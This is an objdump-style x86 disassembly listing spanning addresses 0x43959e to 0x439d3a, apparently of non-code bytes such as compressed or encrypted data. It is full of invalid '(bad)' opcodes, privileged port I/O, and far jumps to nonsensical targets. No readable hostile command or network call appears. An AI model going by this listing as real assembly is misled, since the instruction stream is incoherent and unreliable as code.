  43959e:	mov    WORD PTR [ecx-0x22f7fdc9],fs
  4395a4:	js     0x43961a
  4395a6:	xchg   BYTE PTR [ebp-0x7],dl
  4395a9:	pop    eax
  4395aa:	xchg   esi,eax
  4395ab:	rcr    DWORD PTR [esi+0x4],cl
  4395ae:	mov    esp,0xf555c9d5
  4395b3:	imul   eax,DWORD PTR [ebx],0x5d
  4395b6:	cmp    al,0xa1
  4395b8:	daa    
  4395b9:	lea    eax,ds:0x83836306
  4395bf:	into   
  4395c0:	jno    0x4395ca
  4395c2:	mov    dh,bl
  4395c4:	cld    
  4395c5:	mov    WORD PTR [edx+0x6e],fs
  4395c8:	xor    al,0xe5
  4395ca:	dec    esp
  4395cb:	popf   
  4395cc:	retf   0xbcb8
  4395cf:	pop    ss
  4395d0:	aas    
  4395d1:	jno    0x43963d
  4395d3:	icebp  
  4395d4:	push   ds
  4395d5:	add    al,0xe7
  4395d7:	ins    DWORD PTR es:[edi],dx
  4395d8:	dec    ebx
  4395d9:	in     eax,0x5c
  4395db:	popf   
  4395dc:	retf   0x7c98
  4395df:	idiv   DWORD PTR [edi]
  4395e1:	jno    0x439635
  4395e3:	jno    0x439603
  4395e5:	add    al,0x0
  4395e7:	out    0xed,eax
  4395e9:	imul   edi,ebp,0x27
  4395ec:	sbb    ebx,DWORD PTR [ecx-0x30]
  4395ef:	loope  0x439661
  4395f1:	(bad)  
  4395f2:	in     al,0xa6
  4395f4:	xchg   ecx,eax
  4395f5:	jg     0x4395e9
  4395f7:	xor    al,0xe5
  4395f9:	cwde   
  4395fa:	cld    
  4395fb:	loopne 0x439657
  4395fd:	add    eax,DWORD PTR [ebp-0x79556d63]
  439603:	push   ecx
  439604:	xchg   edi,eax
  439605:	cmp    eax,0x4d5a22d
  43960a:	(bad)  
  43960b:	fld    TBYTE PTR [esi]
  43960d:	mov    esp,0x85daa154
  439612:	mul    bh
  439614:	mov    BYTE PTR [eax+0x2fb655c],dl
  43961a:	(bad)  
  43961b:	out    0x6f,eax
  43961d:	nop
  43961e:	push   esp
  43961f:	push   ecx
  439620:	(bad)  
  439621:	mov    ecx,0x1bae7084
  439626:	sub    ebp,edi
  439628:	sub    al,0xa6
  43962a:	std    
  43962b:	seta   dh
  43962e:	jl     0x43969a
  439630:	out    0x8f,al
  439632:	cld    
  439633:	loopne 0x439636
  439635:	(bad)  
  439636:	push   edx
  439637:	enter  0xb732,0xe4
  43963b:	jbe    0x43965d
  43963d:	jge    0x439637
  43963f:	mov    ebx,ecx
  439641:	xchg   esi,eax
  439642:	stc    
  439643:	(bad)  
  439644:	or     esi,esp
  439646:	test   ah,dh
  439648:	or     ebx,ebp
  43964a:	inc    ebp
  43964b:	add    BYTE PTR [ebx+0x70],bl
  43964e:	cmp    al,BYTE PTR [ebp+eiz*8+0x1d58eedb]
  439655:	mov    edi,0x3d8746c2
  43965a:	lea    ebp,[ecx+0x46e19e0]
  439660:	xchg   DWORD PTR [edi],esp
  439662:	jmp    0xc174baf1
  439667:	mov    esp,DWORD PTR [eax]
  439669:	jmp    0x709ec904
  43966e:	mov    eax,ds:0x24e7e7e8
  439673:	xor    eax,0xa6181fe7
  439678:	(bad)  
  43967a:	push   cs
  43967b:	inc    ebx
  43967c:	jg     0x439697
  43967e:	inc    esp
  43967f:	or     al,0x40
  439681:	(bad)  
  439682:	out    0xbb,eax
  439684:	sbb    bl,BYTE PTR [eax+esi*1]
  439687:	mov    eax,ebp
  439689:	data16 sub ah,dh
  43968c:	sbb    eax,0x2abe020
  439691:	call   0xc3dc:0x4d711ee9
  439698:	xchg   ebp,eax
  439699:	arpl   WORD PTR [eax+0x67e4ce2c],sp
  43969f:	pop    ds
  4396a0:	fbld   TBYTE PTR [edi]
  4396a2:	daa    
  4396a3:	push   es
  4396a4:	jmp    0xe388:0x8a03aa58
  4396ab:	sbb    eax,0x798646b
  4396b0:	add    BYTE PTR [ebx-0x5d9c2a21],ah
  4396b6:	fst    DWORD PTR [edi+0x167c52c]
  4396bc:	ss ins DWORD PTR es:[edi],dx
  4396be:	pop    esi
  4396bf:	inc    ebp
  4396c0:	add    eax,0x9dca5c5a
  4396c5:	push   0x41
  4396c7:	pop    eax
  4396c8:	fld    DWORD PTR [edx+0x61edc332]
  4396ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4396cf:	dec    esi
  4396d0:	(bad)  
  4396d1:	iret   
  4396d2:	fbstp  TBYTE PTR [ebx]
  4396d4:	sub    ebp,edx
  4396d6:	pop    edx
  4396d7:	out    dx,eax
  4396d8:	jne    0x4396da
  4396da:	pop    ebp
  4396db:	push   edx
  4396dc:	in     eax,dx
  4396dd:	fdiv   DWORD PTR [esp+ebx*1+0x1c94dbd5]
  4396e4:	stc    
  4396e5:	call   0xcdf414c8
  4396ea:	fnstsw WORD PTR [eax]
  4396ec:	xor    BYTE PTR [esi-0x54],bl
  4396ef:	std    
  4396f0:	(bad)  
  4396f2:	jecxz  0x439760
  4396f4:	fldenv [ecx-0x471a3d4c]
  4396fa:	sbb    DWORD PTR [ebx-0x3f],esi
  4396fd:	mov    al,0x77
  4396ff:	pop    eax
  439700:	wbinvd 
  439702:	jbe    0x439709
  439704:	jmp    0x16023f1
  439709:	jmp    0x439731
  43970b:	ins    DWORD PTR es:[edi],dx
  43970c:	jmp    0x4396ec
  43970e:	mov    ebp,DWORD PTR ss:[eax+0x724e4578]
  439715:	add    BYTE PTR [ebp-0x58],cl
  439718:	dec    edi
  439719:	ins    BYTE PTR es:[edi],dx
  43971a:	stos   BYTE PTR es:[edi],al
  43971b:	xor    edx,DWORD PTR [ecx+0x76]
  43971e:	jmp    0x8ac:0x64708be3
  439725:	push   ecx
  439726:	or     dh,BYTE PTR [edx]
  439728:	clc    
  439729:	pop    esi
  43972a:	jmp    0xec77:0x90ed6d18
  439731:	mov    ds:0x40bfaf,eax
  439736:	dec    ecx
  439737:	fild   DWORD PTR [eax]
  439739:	xor    ecx,DWORD PTR [ebp+0x335f96c]
  43973f:	pop    eax
  439740:	inc    esp
  439741:	add    BYTE PTR [ecx+esi*1-0x4],dh
  439745:	adc    BYTE PTR [ebx],cl
  439747:	fild   DWORD PTR [ebx-0x6d73040]
  43974d:	jne    0x43977a
  43974f:	fs leave 
  439751:	dec    esi
  439753:	out    0xf9,al
  439755:	jne    0x43976a
  439757:	add    edi,DWORD PTR [eax+esi*2-0xf822aeb]
  43975e:	jle    0x43972c
  439760:	ins    BYTE PTR es:[edi],dx
  439761:	adc    al,0x80
  439763:	fist   WORD PTR [edx-0x75]
  439766:	mov    ah,0xd4
  439768:	push   eax
  439769:	adc    BYTE PTR [eax+0x75f9d5],cl
  43976f:	(bad)  
  439770:	retf   
  439771:	call   0x3edc43
  439776:	fcomp  DWORD PTR [edx+0x500002dd]
  43977c:	lahf   
  43977d:	pop    edx
  43977e:	pop    edi
  43977f:	add    bl,BYTE PTR [eax+edx*1+0x456a6a00]
  439786:	push   ebp
  439787:	jge    0x4397e9
  439789:	xor    al,0x30
  43978b:	mov    ecx,0x4056f81a
  439790:	repnz push 0xf81d1ca8
  439796:	(bad)  
  439797:	fcom   st(5)
  439799:	shr    BYTE PTR [eax-0x41],cl
  43979c:	mov    esp,0x8140040
  4397a1:	jge    0x43978b
  4397a3:	hlt    
  4397a4:	out    dx,al
  4397a5:	and    eax,0x83d4f0f6
  4397aa:	in     eax,dx
  4397ab:	pop    DWORD PTR [esi-0x7d]
  4397ae:	jmp    DWORD PTR [edx+0x14]
  4397b1:	in     al,dx
  4397b2:	mov    bl,BYTE PTR [esi]
  4397b4:	fdiv   st(0),st
  4397b6:	dec    edi
  4397b7:	mov    ah,0x9f
  4397b9:	cwde   
  4397ba:	and    edi,DWORD PTR [esi-0x9]
  4397bd:	das    
  4397be:	and    DWORD PTR [edx],0x75
  4397c1:	cld    
  4397c2:	dec    esi
  4397c3:	inc    ebp
  4397c4:	ins    BYTE PTR es:[edi],dx
  4397c5:	loopne 0x4397ea
  4397c7:	jmp    0x7eb7adb6
  4397cc:	xor    al,0x2c
  4397ce:	or     eax,0xf9044062
  4397d3:	scas   al,BYTE PTR es:[edi]
  4397d4:	sbb    al,0xf0
  4397d6:	test   BYTE PTR [edx],dl
  4397d8:	fild   QWORD PTR ds:0xb6fde959
  4397de:	pop    edx
  4397df:	add    BYTE PTR [ecx+0x56bdbb49],ch
  4397e5:	inc    eax
  4397e6:	sub    esp,0x51aff3aa
  4397ec:	jmp    0xa25164bd
  4397f1:	inc    eax
  4397f2:	lods   eax,DWORD PTR ds:[esi]
  4397f3:	test   bl,ch
  4397f5:	xchg   edi,eax
  4397f6:	xor    al,0xa1
  4397f8:	and    al,BYTE PTR [eax+0x15]
  4397fb:	xor    DWORD PTR [ebp+0x6c2be8fb],ebx
  439801:	inc    eax
  439802:	add    al,0x0
  439804:	lds    ecx,FWORD PTR [ebp-0x54]
  439807:	repz add eax,0x6df8fd00
  43980d:	stos   DWORD PTR es:[edi],eax
  43980e:	sub    edi,ecx
  439810:	xchg   esp,eax
  439811:	xlat   BYTE PTR ds:[ebx]
  439812:	adc    BYTE PTR [eax+0x31154022],ch
  439818:	jmp    0xea15ad94
  43981d:	scas   eax,DWORD PTR es:[edi]
  43981e:	mov    dh,BYTE PTR [esi+eax*2+0x20]
  439822:	jg     0x43980f
  439824:	push   ebp
  439825:	mov    esp,0xd87dfeb6
  43982a:	jmp    0x5e2927b5
  43982f:	mov    dh,0x6c
  439831:	xor    eax,0xe57086ea
  439836:	pop    ebp
  439837:	into   
  439838:	pop    esp
  439839:	xor    eax,0x6315d0ea
  43983e:	sahf   
  43983f:	out    0x75,eax
  439841:	bound  esp,QWORD PTR [esi+0x627100e7]
  439847:	sahf   
  439848:	out    0x59,eax
  43984a:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43984c:	out    0x59,eax
  43984e:	mov    DWORD PTR [edi+eax*8-0x7f],esp
  439852:	sar    DWORD PTR [ecx+0x2a5f111c],1
  439858:	or     al,0xe1
  43985a:	(bad)  
  43985b:	call   0xa6a3fa63
  439860:	out    0x69,eax
  439862:	pop    esi
  439863:	and    DWORD PTR [esi+ebx*8],ecx
  439866:	shr    al,cl
  439868:	add    esp,DWORD PTR [edx-0xe]
  43986b:	and    eax,0x5de451e0
  439870:	or     ebp,ebp
  439872:	xor    al,0xea
  439874:	sub    edx,edi
  439876:	gs (bad) 
  439878:	sbb    esp,edi
  43987a:	xor    DWORD PTR [ebp+0x1b],esp
  43987d:	imul   ebx,DWORD PTR [ebp-0x16],0x4
  439881:	(bad)  
  439882:	fst    DWORD PTR [esi]
  439884:	sbb    ecx,DWORD PTR [esi-0x3]
  439887:	or     DWORD PTR [ebx],ebx
  439889:	ss std 
  43988b:	std    
  43988c:	sbb    ah,BYTE PTR [edi-0x5d7e7b18]
  439892:	scas   al,BYTE PTR es:[edi]
  439893:	sub    BYTE PTR [edi-0x1ff20d4f],cl
  439899:	jno    0x439846
  43989b:	mov    ah,0x88
  43989d:	cmp    ebp,ecx
  43989f:	jbe    0x439878
  4398a1:	mov    ch,BYTE PTR [ebp+0x31e5cd00]
  4398a7:	push   cs
  4398a8:	mov    cl,0x0
  4398aa:	jbe    0x4398a0
  4398ac:	add    BYTE PTR [esi+ebx*1-0x53],ch
  4398b0:	add    al,0xa7
  4398b2:	in     al,0x76
  4398b4:	inc    ebp
  4398b5:	adc    dl,dl
  4398b7:	clc    
  4398b8:	or     al,0xdb
  4398ba:	cmp    DWORD PTR [esi],0xf
  4398bd:	shl    BYTE PTR [ebx-0x5b],cl
  4398c0:	push   0xffffffd9
  4398c2:	sub    cl,BYTE PTR fs:[edi+0x64]
  4398c6:	and    bh,al
  4398c8:	xor    BYTE PTR [ecx+0x26857d89],bl
  4398ce:	pop    ecx
  4398cf:	pop    esp
  4398d0:	lds    edi,FWORD PTR gs:0x41cd6d5d
  4398d7:	pop    ebp
  4398d8:	enter  0xdc01,0x5f
  4398dc:	clc    
  4398dd:	push   es
  4398de:	fnsave [esp+ebx*1+0x7de261d5]
  4398e5:	push   ebp
  4398e6:	pop    esi
  4398e7:	fld    DWORD PTR [eax]
  4398e9:	pop    esp
  4398ea:	and    bh,al
  4398ec:	sbb    BYTE PTR [ecx],bh
  4398ee:	or     eax,0xb3364031
  4398f3:	xor    BYTE PTR [esi],cl
  4398f5:	lods   eax,DWORD PTR ds:[esi]
  4398f6:	repz repz add BYTE PTR [ecx+eiz*1-0x1e],ah
  4398fc:	jge    0x43996b
  4398fe:	popa   
  4398ff:	fld    DWORD PTR [eax]
  439901:	jb     0x439910
  439903:	clc    
  439904:	sbb    BYTE PTR [ecx+eiz*1-0x1e],ch
  439908:	jl     0x439973
  43990a:	popa   
  43990b:	fld    DWORD PTR [eax]
  43990d:	push   0x0
  43990f:	int    0xf7
  439911:	sbb    al,0xe9
  439913:	faddp  st(4),st
  439915:	sbb    al,0xd1
  439917:	shl    ebp,cl
  439919:	push   0xfffffff9
  43991b:	leave  
  43991c:	imul   DWORD PTR [eax-0x7422b500]
  439922:	inc    esp
  439923:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  439924:	jae    0x43996e
  439926:	call   0x3dfa6c
  43992b:	add    BYTE PTR [esp+0x38],dh
  43992f:	nop
  439930:	xchg   edi,eax
  439931:	adc    al,0x8d
  439933:	mov    edi,0xb7c72413
  439938:	xor    ecx,DWORD PTR [eax+0x4]
  43993b:	dec    ebx
  43993c:	xlat   BYTE PTR ds:[ebx]
  43993d:	add    BYTE PTR [ebx+0x6b301307],cl
  439943:	jnp    0x43996f
  439945:	jg     0x4399c3
  439947:	aaa    
  439948:	sbb    edi,DWORD PTR [ebp+0x44]
  43994b:	addr16 adc eax,0x645fc05d
  439951:	inc    ebp
  439952:	add    al,0xf7
  439954:	iret   
  439955:	cmp    al,0x24
  439957:	adc    esp,DWORD PTR [ebp+edi*1+0x24]
  43995b:	adc    esp,DWORD PTR [edx+0x45]
  43995e:	and    al,0x23
  439960:	outs   dx,BYTE PTR ds:[esi]
  439961:	mov    ecx,DWORD PTR [edi+eiz*1+0x3b]
  439965:	inc    edi
  439966:	push   eax
  439967:	or     al,0x64
  439969:	and    al,0x68
  43996b:	or     al,0xea
  43996d:	add    eax,0x70
  439970:	sbb    DWORD PTR [eax+ebx*1],esp
  439973:	add    BYTE PTR [eax-0x1b],dh
  439976:	ins    BYTE PTR es:[edi],dx
  439977:	or     BYTE PTR [ebx],ch
  439979:	rol    BYTE PTR [edi+0x8],1
  43997c:	inc    eax
  43997d:	repnz fst QWORD PTR [eax]
  439980:	jbe    0x439904
  439982:	push   ebx
  439983:	push   ebp
  439984:	imul   edx,eax,0x47
  439987:	adc    al,0x40
  439989:	sbb    DWORD PTR [eax+ebx*1],esp
  43998c:	mov    al,ds:0x1cc025db
  439991:	outs   dx,DWORD PTR ds:[esi]
  439992:	pop    ebx
  439993:	pop    ebx
  439994:	cmp    BYTE PTR [ecx+0x3c62c248],bl
  43999a:	add    al,0x2d
  43999c:	stos   DWORD PTR es:[edi],eax
  43999d:	(bad)  
  43999e:	add    al,0x85
  4399a0:	mov    ds:0x11ff64f6,eax
  4399a5:	sub    DWORD PTR [ebx],esi
  4399a7:	call   0xb8c0b9fb
  4399ac:	(bad)  
  4399ad:	push   edi
  4399ae:	dec    esi
  4399b0:	mov    ah,BYTE PTR [esi-0x79]
  4399b3:	jmp    0x58c2d693
  4399b8:	in     eax,0x83
  4399ba:	add    al,0x3f
  4399bc:	jecxz  0x439946
  4399be:	cld    
  4399bf:	(bad)  
  4399c0:	push   ebp
  4399c1:	inc    eax
  4399c2:	mov    ss,esi
  4399c4:	adc    al,BYTE PTR [ecx+0x3d]
  4399c7:	push   edx
  4399c8:	lods   eax,DWORD PTR ds:[esi]
  4399c9:	mov    bh,0x13
  4399cb:	sub    eax,0x72da293d
  4399d0:	pop    eax
  4399d1:	dec    eax
  4399d2:	(bad)  
  4399d3:	jmp    FWORD PTR ds:0xfea6d0
  4399d9:	mov    WORD PTR [ebx-0x4e],?
  4399dc:	clc    
  4399dd:	ja     0x439a27
  4399df:	hlt    
  4399e0:	aas    
  4399e1:	(bad)  
  4399e2:	lds    edi,FWORD PTR [ebx+esi*2]
  4399e5:	fs test eax,0xd7222dda
  4399eb:	(bad)  
  4399ec:	scas   eax,DWORD PTR es:[edi]
  4399ed:	arpl   WORD PTR [ebx-0x46],sp
  4399f0:	mov    esp,0x3e103e9
  4399f5:	xchg   esp,eax
  4399f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4399f7:	adc    al,BYTE PTR [edi+0x47cc389c]
  4399fd:	push   esi
  4399fe:	cmp    DWORD PTR [ebp+0x22],edi
  439a01:	bound  edi,QWORD PTR [edi+0x76203a1]
  439a07:	sar    DWORD PTR [esp+edx*2+0x6b],0x12
  439a0c:	add    eax,DWORD PTR [edx]
  439a0e:	in     al,dx
  439a0f:	sar    bh,0x62
  439a12:	fst    DWORD PTR [ebx*8-0x68a975e2]
  439a19:	xor    DWORD PTR [ebp-0x34654f17],ebx
  439a1f:	adc    eax,0x73d955f6
  439a24:	imul   ch
  439a26:	lods   al,BYTE PTR ds:[esi]
  439a27:	sbb    eax,0xe9159004
  439a2c:	mov    ss,WORD PTR [ecx+eax*2+0x4]
  439a30:	sbb    DWORD PTR [ebx+0x31],edi
  439a33:	inc    bx
  439a35:	test   al,0x6a
  439a38:	faddp  st(1),st
  439a3a:	lods   al,BYTE PTR ds:[esi]
  439a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a3c:	add    eax,DWORD PTR [eax]
  439a3e:	bound  ebx,QWORD PTR [ecx+0x23]
  439a41:	add    ch,dl
  439a43:	into   
  439a44:	mov    DWORD PTR [edi+0x188ed9a1],ecx
  439a4a:	jno    0x4399e5
  439a4c:	fcmovnb st,st(3)
  439a4e:	cmp    eax,0x208c9290
  439a53:	nop
  439a54:	sub    edi,edi
  439a56:	sub    eax,0xdf127287
  439a5b:	xchg   edi,eax
  439a5c:	loope  0x439a29
  439a5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439a60:	out    0x84,eax
  439a62:	cwde   
  439a63:	aad    0xe9
  439a65:	(bad)  
  439a66:	xor    BYTE PTR fs:[eax-0x1],dh
  439a6a:	or     al,bh
  439a6c:	(bad)
  439a6f:	fldcw  WORD PTR [edx-0x27]
  439a72:	cmc    
  439a73:	lods   al,BYTE PTR ds:[esi]
  439a74:	repz test eax,0x17102fed
  439a7a:	push   ecx
  439a7b:	fyl2xp1 
  439a7d:	ret    
  439a7e:	fisttp QWORD PTR [esi+0x3ddeb1aa]
  439a84:	sbb    ebp,DWORD PTR [esi-0x74f0d51a]
  439a8a:	and    cl,ah
  439a8c:	add    BYTE PTR [ecx],ah
  439a8e:	scas   al,BYTE PTR es:[edi]
  439a8f:	lods   al,BYTE PTR ds:[esi]
  439a90:	push   esp
  439a91:	rcl    DWORD PTR [ebx-0x1d5907cf],0x19
  439a98:	outs   dx,BYTE PTR ds:[esi]
  439a99:	in     eax,0x93
  439a9b:	jo     0x439a89
  439a9d:	adc    ebp,ebx
  439a9f:	mov    bl,0xfc
  439aa1:	fld    DWORD PTR [eax]
  439aa3:	pop    eax
  439aa4:	call   0x55c896c0
  439aa9:	aas    
  439aaa:	icebp  
  439aab:	js     0x439b1a
  439aad:	ins    DWORD PTR es:[edi],dx
  439aae:	out    0xa9,al
  439ab0:	stos   DWORD PTR es:[edi],eax
  439ab1:	push   DWORD PTR [eax]
  439ab3:	bound  ebx,QWORD PTR [ecx+0x1]
  439ab6:	jmp    0xa4cf71f3
  439abb:	pop    ebp
  439abc:	ss (bad) 
  439abe:	nop
  439abf:	popa   
  439ac0:	pop    ecx
  439ac1:	add    ecx,ebp
  439ac3:	add    al,0x9d
  439ac5:	push   ebx
  439ac6:	cdq    
  439ac7:	je     0x439ab4
  439ac9:	not    esp
  439acb:	icebp  
  439acc:	fild   WORD PTR [eax-0x17]
  439acf:	loop   0x439ae9
  439ad1:	outs   dx,BYTE PTR ds:[esi]
  439ad2:	in     eax,0xe6
  439ad4:	shr    ebx,1
  439ad6:	sub    eax,0xed6e30f1
  439adb:	dec    esp
  439adc:	lods   al,BYTE PTR ds:[esi]
  439add:	or     BYTE PTR [esi],dl
  439adf:	sub    eax,0x117d0e31
  439ae4:	lock add BYTE PTR [ecx+0x291c115c],dh
  439aeb:	push   ds
  439aec:	xor    eax,0xfe64622c
  439af1:	shl    BYTE PTR [eax+0x76ee3b2],cl
  439af7:	fnstenv [ebx-0x2a6811f8]
  439afd:	cmp    bl,BYTE PTR [edx]
  439aff:	daa    
  439b00:	cld    
  439b01:	imul   ecx
  439b03:	popa   
  439b04:	fld    st(1)
  439b06:	add    BYTE PTR [eax],al
  439b08:	mov    dl,0xe3
  439b0a:	and    eax,0x79743e0c
  439b0f:	inc    esp
  439b10:	retf   
  439b11:	sbb    DWORD PTR ds:0xe3499755,ebp
  439b17:	mov    DWORD PTR [ebp+0x655ef78b],esi
  439b1d:	je     0x439b7a
  439b1f:	ret    0xdb83
  439b22:	push   ebx
  439b23:	mov    edx,DWORD PTR [edi]
  439b25:	gs jge 0x439b79
  439b28:	xchg   ebx,eax
  439b29:	jge    0x439ab6
  439b2b:	inc    edx
  439b2c:	add    al,0x24
  439b2e:	je     0x439b77
  439b30:	or     BYTE PTR [edx],al
  439b32:	add    DWORD PTR [edi+edx*4+0x21],esi
  439b36:	jae    0x439b3c
  439b38:	xchg   ecx,eax
  439b39:	aas    
  439b3a:	fld    QWORD PTR [edi]
  439b3c:	lock dec eax
  439b3e:	cld    
  439b3f:	jmp    0x439b8e
  439b41:	or     DWORD PTR [eax],0xfc49c25e
  439b47:	and    DWORD PTR [edx],0x2f
  439b4a:	clc    
  439b4b:	jae    0x439baa
  439b4d:	cmp    eax,0xffffff8c
  439b50:	push   cs
  439b51:	(bad)  
  439b52:	push   eax
  439b53:	(bad)  
  439b54:	out    dx,al
  439b55:	loop   0x439bb5
  439b57:	add    al,BYTE PTR [ebp+eax*2+0x472eff04]
  439b5e:	or     BYTE PTR [eax+0xb],al
  439b61:	or     al,0xbf
  439b63:	inc    ecx
  439b64:	xor    BYTE PTR [esi+0x4a220573],dl
  439b6a:	cld    
  439b6b:	je     0x439b6d
  439b6d:	stc    
  439b6e:	or     edi,DWORD PTR [edi+0xa034a8a]
  439b74:	xor    cl,BYTE PTR [ebx+0x3]
  439b77:	dec    BYTE PTR [edx+0x84461f2]
  439b7d:	or     al,0xeb
  439b7f:	jg     0x439b89
  439b81:	bound  edx,QWORD PTR [eax+0x4]
  439b84:	pop    edx
  439b85:	stos   DWORD PTR es:[edi],eax
  439b86:	add    BYTE PTR ds:0x28ab3700,0x7d
  439b8d:	mov    dh,0x3c
  439b8f:	mov    cl,0x51
  439b91:	adc    esi,DWORD PTR [ebp+0x72e9f3bf]
  439b97:	and    eax,0xe77ac5b
  439b9c:	mov    edx,DWORD PTR [edi]
  439b9e:	inc    esp
  439b9f:	push   cs
  439ba0:	jae    0x439c10
  439ba2:	inc    edi
  439ba3:	mov    BYTE PTR [edi],al
  439ba5:	mov    bh,BYTE PTR [ebp+0xf]
  439ba8:	stc    
  439ba9:	lea    edi,[esp+edi*1-0x592e8f8c]
  439bb0:	mov    ch,BYTE PTR [edi]
  439bb2:	lods   al,BYTE PTR ds:[esi]
  439bb3:	and    al,0x6c
  439bb5:	jne    0x439b76
  439bb7:	or     eax,0xf80ca284
  439bbc:	lods   al,BYTE PTR ds:[esi]
  439bbd:	arpl   WORD PTR [ebx-0x4ac6d1fe],cx
  439bc3:	mov    edi,0xeb34af3
  439bc8:	stc    
  439bc9:	dec    ebp
  439bca:	stos   BYTE PTR es:[edi],al
  439bcb:	inc    ecx
  439bcc:	pop    edx
  439bcd:	test   eax,0x842e9
  439bd2:	bound  ecx,QWORD PTR [ebp-0x77]
  439bd5:	in     al,dx
  439bd6:	jecxz  0x439bc3
  439bd8:	mov    esp,0xb1402dfd
  439bdd:	push   ecx
  439bde:	lea    ecx,[eax+0x3a]
  439be1:	add    BYTE PTR [edx+0x40],ah
  439be4:	rcl    esp,1
  439be6:	mov    cl,0x9f
  439be8:	mov    ah,0x7c
  439bea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  439beb:	inc    eax
  439bec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439bed:	clc    
  439bee:	outs   dx,DWORD PTR ds:[esi]
  439bef:	push   esp
  439bf0:	out    0x3f,al
  439bf2:	(bad)  
  439bf4:	inc    eax
  439bf5:	or     al,0xb8
  439bf7:	int    0x81
  439bf9:	inc    esp
  439bfa:	(bad)  
  439bfb:	fst    DWORD PTR [ebx+0x2]
  439bfe:	lods   eax,DWORD PTR ds:[esi]
  439bff:	out    dx,eax
  439c00:	or     BYTE PTR [esp+ebp*2],ch
  439c03:	inc    ecx
  439c04:	(bad)  
  439c05:	adc    al,bl
  439c07:	sub    eax,0x2c0c8655
  439c0c:	mov    edi,0x72a8ba14
  439c11:	adc    al,0xbb
  439c13:	pop    ebx
  439c14:	jp     0x439c47
  439c16:	mov    ch,0x2d
  439c18:	jmp    0xab97:0xf9409888
  439c1f:	sub    eax,0xa21a435d
  439c24:	add    esi,eax
  439c26:	call   0x1df64dc6
  439c2b:	xchg   DWORD PTR [edx],ebx
  439c2d:	mov    cl,0x8a
  439c2f:	ret    
  439c30:	xor    edx,0x4364d93d
  439c36:	add    al,bh
  439c38:	in     eax,0xff
  439c3a:	fimul  DWORD PTR [ecx]
  439c3c:	xchg   esp,eax
  439c3d:	aaa    
  439c3e:	(bad)  
  439c3f:	pop    ecx
  439c40:	pop    edx
  439c41:	(bad)  
  439c42:	out    dx,eax
  439c43:	fadd   DWORD PTR [eax]
  439c45:	sbb    esi,DWORD PTR [edx]
  439c47:	shl    BYTE PTR [edx-0x52],0xbe
  439c4b:	xor    eax,0xd53955f
  439c50:	aaa    
  439c51:	jmp    0x38e8:0x97416203
  439c58:	sub    eax,0x8a15be55
  439c5d:	ins    BYTE PTR es:[edi],dx
  439c5e:	scas   al,BYTE PTR es:[edi]
  439c5f:	cmc    
  439c60:	pusha  
  439c61:	daa    
  439c62:	sub    esp,DWORD PTR [edi]
  439c64:	dec    BYTE PTR [esp+edx*1]
  439c67:	loope  0x439c82
  439c69:	xlat   BYTE PTR ds:[ebx]
  439c6a:	outs   dx,BYTE PTR ds:[esi]
  439c6b:	and    dl,BYTE PTR [esi+0x2a]
  439c6e:	mov    ds,WORD PTR [ebp-0x18]
  439c71:	sub    DWORD PTR [ebp+0x6a0091de],ebx
  439c77:	mov    ch,0x2c
  439c79:	mov    ecx,0xd963ff
  439c7e:	je     0x439c5b
  439c80:	imul   esi,esi,0xffffffde
  439c83:	jno    0x439ce6
  439c85:	sbb    DWORD PTR [ecx],ebp
  439c87:	pop    ss
  439c88:	test   al,0xfa
  439c8a:	adc    BYTE PTR cs:[ebp+0x2],bh
  439c8e:	and    al,BYTE PTR [edi+0x57724f6e]
  439c94:	push   esi
  439c95:	pop    es
  439c96:	ins    BYTE PTR es:[edi],dx
  439c97:	ja     0x439c3e
  439c99:	or     cl,al
  439c9b:	add    dh,cl
  439c9d:	push   cs
  439c9e:	mul    BYTE PTR [esi+0x3f00f7dd]
  439ca4:	and    eax,0x789f3387
  439ca9:	fcomp  st(0)
  439cab:	adc    eax,0x1e012c9a
  439cb0:	add    eax,0xb4b56e24
  439cb5:	gs jne 0x439cb5
  439cb8:	popf   
  439cb9:	sub    al,0x53
  439cbb:	outs   dx,BYTE PTR ds:[esi]
  439cbc:	imul   esp,DWORD PTR [eax+0x2761a912],0xfffffffe
  439cc3:	inc    eax
  439cc4:	cli    
  439cc5:	xchg   edi,eax
  439cc6:	add    al,ch
  439cc8:	cli    
  439cc9:	leave  
  439cca:	call   0xf8760db0
  439ccf:	ins    DWORD PTR es:[edi],dx
  439cd0:	sahf   
  439cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  439cd2:	add    eax,0x6d116369
  439cd7:	lods   eax,DWORD PTR ds:[esi]
  439cd8:	popa   
  439cd9:	sub    al,0x89
  439cdb:	hlt    
  439cdc:	jge    0x439c83
  439cde:	cmp    al,0xe9
  439ce0:	in     al,dx
  439ce1:	xor    BYTE PTR [esi],cl
  439ce3:	test   eax,0xb200ec17
  439ce8:	stc    
  439ce9:	and    DWORD PTR [ebp+eiz*4+0x688761],eax
  439cf0:	iret   
  439cf1:	dec    ebx
  439cf2:	inc    esp
  439cf3:	add    ah,bh
  439cf5:	xor    BYTE PTR [edx+edx*1-0x3f7c2835],ah
  439cfc:	ja     0x439d2b
  439cfe:	jge    0x439cc8
  439d00:	add    BYTE PTR [ebx],dl
  439d02:	dec    edx
  439d03:	xlat   BYTE PTR ds:[ebx]
  439d04:	std    
  439d05:	mov    esp,0xb585f0aa
  439d0a:	inc    ebx
  439d0b:	add    cl,BYTE PTR [ecx-0x15087a8c]
  439d11:	mov    ecx,0x5d5fb805
  439d16:	xchg   esp,eax
  439d17:	push   ebx
  439d18:	mov    ebx,DWORD PTR [edi-0xaeb1aae]
  439d1e:	loopne 0x439cf8
  439d20:	je     0x439d99
  439d22:	aad    0xf7
  439d24:	push   ebp
  439d25:	adc    dh,BYTE PTR [ecx-0x4]
  439d28:	mov    edi,edx
  439d2a:	push   eax
  439d2b:	xor    edx,DWORD PTR [edi+0x1c]
  439d2e:	pop    esp
  439d2f:	je     0x439d75
  439d31:	jnp    0x439da1
  439d33:	stc    
  439d34:	adc    eax,0x38234f
  439d39:	cmc    
  439d3a:	loopne 0x439d14
